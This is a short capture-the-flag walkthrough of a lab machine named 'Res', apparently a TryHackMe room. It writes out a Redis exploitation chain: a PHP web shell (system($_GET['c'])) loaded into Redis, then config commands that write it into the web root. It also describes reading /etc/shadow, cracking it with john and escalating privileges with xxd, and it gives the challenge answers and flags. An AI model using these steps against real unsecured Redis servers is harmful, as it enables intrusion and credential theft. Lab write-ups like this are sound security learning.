# Res

> John Hammond | Sunday, October 4th, 2020

-------------------------------------------

```
export IP=10.10.196.130
```


1. Scan the machine, how many ports are open?

```
2
```


2. What's is the database management system installed on the server?

```
Redis
```


3. What port is the database management system running on?

```
6379
```

4. What's is the version of management system installed on the server?


```
sudo apt install redis-cli
```


Connect:

```
redis-cli -h 10.10.196.130
```

Run the command:

```
info
```



```
6.0.7
```

5. Compromise the machine and locate user.txt

Prepare a basic PHP shell

```
<?php
	die(system($_GET['c']))
?>
```

Get it in memory of the redis server

```
cat shell.php | redis-cli -h $IP -x set shell
```

Write and dump 

```bash
# Write the file
config set dir /var/www/html
config get dir 
config set dbfilename shell.php
save
```

Use this to get initial access


6. What is the local user account password?

I got root before I solved this

Grab `/etc/shadow` and use `john` to hashcrack

```
beautiful1
```

7. What is root.txt?

xxd privilege escalation

```
thm{xxd_pr1v_escalat1on}
```